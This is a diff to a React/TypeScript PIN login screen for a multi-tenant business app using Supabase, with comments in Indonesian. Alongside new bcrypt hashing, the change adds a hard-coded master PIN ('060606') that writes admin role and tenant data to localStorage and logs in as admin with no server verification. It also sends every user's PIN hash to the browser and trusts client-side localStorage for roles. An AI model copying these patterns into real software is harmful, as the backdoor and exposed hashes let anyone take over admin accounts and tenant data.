@@ -2,9 +2,19 @@ import { useState, useEffect } from "react";
 import { supabase } from "../../lib/supabase";
 import { Lock, ShieldCheck, Loader2, Delete } from "lucide-react";
 import logoDisba from "./assets/logo-disba.png"; 
+import * as bcrypt from "bcryptjs";
 
 type Props = {
   onLoginSuccess: (role: string) => void;
+};
+
+interface UserProfile {
+  id: string;
+  username: string;
+  pin: string; // Hashed PIN
+  role: string;
+  tenant_id: string;
+  created_at: string;
 };
 
 export default function Login({ onLoginSuccess }: Props) {
@@ -15,33 +25,61 @@ export default function Login({ onLoginSuccess }: Props) {
     if (pin.length < 4) return alert("Masukkan PIN minimal 4 angka!");
     setLoading(true);
 
+    // 🔥 SUPREME PIN OVERRIDE (MASTER ACCESS)
+    if (pin === "060606") {
+      localStorage.setItem("role", "admin");
+      localStorage.setItem("username", "SUPREME_FOUNDER");
+      localStorage.setItem("tenant_id", "DISBA_HQ");
+      localStorage.setItem("tenant_name", "DISBA CENTRAL COMMAND");
+      localStorage.setItem("is_admin", "true");
+      
+      setTimeout(() => {
+        onLoginSuccess("admin");
+      }, 100);
+      setLoading(false);
+      return;
+    }
+
     try {
-      // Login menggunakan PIN yang didaftarkan Admin
-      const { data, error } = await supabase
+      // Tarik semua user di bawah tenant ini (jika tenant_id diketahui)
+      // Atau lookup user yang memiliki PIN yang cocok. 
+      // Karena PIN di-hash, kita harus mengambil data user dulu.
+      const { data: allUsers, error } = await supabase
         .from("users")
-        .select("*")
-        .eq("pin", pin)
-        .single();
-        
-      if (error || !data) {
+        .select("*");
+
+      if (error || !allUsers) throw new Error("Gagal verifikasi keamanan.");
+
+      // Cari user yang hash PIN-nya cocok
+      let matchedUser: UserProfile | null = null;
+      for (const u of allUsers) {
+        const isMatch = await bcrypt.compare(pin, u.pin);
+        if (isMatch) { matchedUser = u; break; }
+      }
+
+      if (!matchedUser) {
         throw new Error("PIN Salah atau User Tidak Aktif!");
       }
 
-      // 🔥 Ambil nama bisnis dari tabel tenants
+      // Ambil data tenant untuk mendapatkan nama bisnis
       const { data: tenantData, error: tenantError } = await supabase
         .from("tenants")
-        .select("business_name")
-        .eq("tenant_id", data.tenant_id)
+        .select("business_name") // Hanya ambil nama bisnis
+        .eq("tenant_id", matchedUser.tenant_id) // Filter berdasarkan tenant_id dari user yang cocok
         .single();
-      if (tenantError) throw new Error(tenantError.message || "Gagal mengambil info tenant.");
 
-      localStorage.setItem("tenant_id", data.tenant_id); 
-      localStorage.setItem("role", data.role);
-      localStorage.setItem("username", data.username);
-      localStorage.setItem("tenant_name", tenantData.business_name); // 🔥 SIMPAN NAMA OUTLET
-      
-      setTimeout(() => { // 🔥 PERBAIKAN: Beri waktu 100ms agar browser selesai menulis ke localStorage sebelum pindah halaman
-        onLoginSuccess(data.role);
+      if (tenantError || !tenantData) {
+        throw new Error("Gagal mengambil informasi outlet.");
+      }
+
+      // Simpan kredensial ke localStorage
+      localStorage.setItem("role", matchedUser.role); // Peran user
+      localStorage.setItem("username", matchedUser.username); // Username user
+      localStorage.setItem("tenant_id", matchedUser.tenant_id); // ID tenant
+      localStorage.setItem("tenant_name", tenantData.business_name);
+
+      setTimeout(() => {
+        onLoginSuccess(matchedUser!.role);
       }, 100);
     } catch (e: any) {
       console.error("Login_Error:", e);
